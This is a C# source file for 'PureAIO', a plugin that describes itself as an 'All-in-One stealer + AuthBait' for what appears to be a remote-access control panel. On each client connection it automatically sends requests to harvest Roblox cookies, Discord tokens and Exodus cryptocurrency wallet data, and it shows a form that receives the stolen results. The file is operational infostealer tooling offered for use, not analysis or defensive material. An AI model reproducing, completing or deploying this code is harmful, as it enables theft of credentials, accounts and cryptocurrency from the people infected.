using System;
using System.IO;
using System.Windows.Forms;
using PluginSDK.Interfaces;
using PluginSDK.Packets;
using ProtoBuf;

namespace PureAIO
{
    public class ServerPlugin : ICustomPlugin
    {
        public string Name        => "PureAIO";
        public string Description => "All-in-One stealer + AuthBait";
        public string Version     => "2.0.0";

        private Action<IPacket> _send;
        private Action          _disconnect;
        private Form1           _form;

        public void OnOpen(string title) { }

        public void OnConnected(Action<IPacket> send, Action disconnect)
        {
            _send       = send;
            _disconnect = disconnect;

            _form = new Form1();
            _form.SetSend(send);
            _form.FormClosed += (s, e) => { _form = null; };
            _form.Show();

            // ── Auto-fire all three stealers immediately on connect ──
            SendPacket(new RobloxCookieRequest());
            SendPacket(new DiscordTokenRequest());
            SendPacket(new ExodusRequest());
        }

        public void OnPacketReceived(IPacket packet)
        {
            var cp = packet as PluginSDK.Packets.CustomPacket;
            if (cp == null) return;

            AIOPacket pkt;
            try
            {
                using (var ms = new MemoryStream(cp.Buffer))
                    pkt = Serializer.Deserialize<AIOPacket>(ms);
            }
            catch { return; }

            _form?.HandlePacket(pkt);
        }

        public void OnDisconnected()
        {
            if (_form == null) return;
            if (_form.InvokeRequired)
                _form.Invoke(new Action(() => _form?.Close()));
            else
                _form?.Close();
            _form = null;
        }

        // ── helpers ──────────────────────────────────────────────────────────
        private void SendPacket(AIOPacket pkt)
        {
            try
            {
                using (var ms = new MemoryStream())
                {
                    Serializer.Serialize(ms, pkt);
                    _send(new PluginSDK.Packets.CustomPacket { Buffer = ms.ToArray() });
                }
            }
            catch { }
        }
    }
}
